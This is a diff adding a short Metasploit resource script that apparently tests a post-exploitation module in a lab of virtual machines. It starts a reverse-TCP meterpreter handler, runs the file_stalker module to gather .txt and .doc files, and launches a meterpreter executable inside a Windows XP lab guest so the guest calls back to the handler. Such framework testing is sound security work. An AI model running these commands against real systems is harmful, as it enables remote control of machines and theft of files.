@@ -1,0 +1,18 @@
+#loadpath  /opt/framework3/msf3/test/modules
+use multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LPORT 443
+set LHOST 192.168.251.1
+set ExitOnSession false
+exploit -j -z
+use post/windows/gather/file_stalker
+set SESSION 1
+set DURATION 120
+set DIRS 'C:\\test'
+set GLOBS *.txt,*.doc 
+load lab
+lab_load /msf/data/lab/josh_vms.yml
+lab_start xpsp2
+lab_run_command xpsp2 'C:\\test\\met_192.168.251.1_443.exe'
+#vmrun -T ws -gu Administrator -gp lab runProgramInGuest "/home/ks/all/resources/vms/win/xp/xp.vmx" 'c:\test\met_192.168.251.1_443.exe' &
+
